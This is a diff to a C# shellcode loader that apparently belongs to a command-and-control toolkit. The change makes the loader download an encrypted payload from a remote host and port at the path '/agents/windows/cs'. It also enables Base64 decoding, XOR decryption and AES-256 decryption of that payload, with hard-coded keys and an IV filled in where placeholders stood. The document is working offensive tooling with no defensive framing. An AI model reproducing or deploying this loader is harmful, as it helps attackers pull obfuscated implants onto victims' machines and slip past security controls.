@@ -129,16 +129,14 @@ namespace ShellcodeLoader
 
             using (var client = new WebClient())
             {
-                // Download the shellcode
-                Console.WriteLine("http://" + host + ":" + port + "/demon.x64.bin");
-                shellcode = client.DownloadData("http://" + host + ":" + port + "/demon.x64.bin");
+                shellcode = client.DownloadData("http://" + host + ":" + port + "/agents/windows/cs");
             }
 
-            /*// Base64 decoding
+            // Base64 decoding
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
             // XOR decryption
-			var xorKey = Convert.FromBase64String("#1"); // XOR key
+			var xorKey = Convert.FromBase64String("bJ/ifc5CSBeUAtZ7JDzdtVGuZXwF2dELjs3GoVEtB2w="); // XOR key
             shellcode = XORDecrypt(shellcode, xorKey);
 
             // AES decryption process
@@ -152,20 +150,20 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptSetProperty failed with status " + ntStatus);
 
-			var key = Convert.FromBase64String("#2"); // AES-256 key
+			var key = Convert.FromBase64String("101bWs97ihqXoyMKszGOmDhhKQef0ooTbWHoXc1H/Hk="); // AES-256 key
             var hKey = IntPtr.Zero;
             ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
             if (ntStatus != 0)
                 throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);
 
-			var iv = Convert.FromBase64String("#3"); // AES IV
+			var iv = Convert.FromBase64String("4S64orXhGJR3ewqe73CYhg=="); // AES IV
             var decryptedShellcode = new byte[shellcode.Length];
             uint decryptedShellcodeSize;
             ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
             if (ntStatus != 0)
                 throw new Exception("BCryptDecrypt failed with status " + ntStatus);
 
-            shellcode = decryptedShellcode;*/
+            shellcode = decryptedShellcode;
 
             return shellcode;
         }
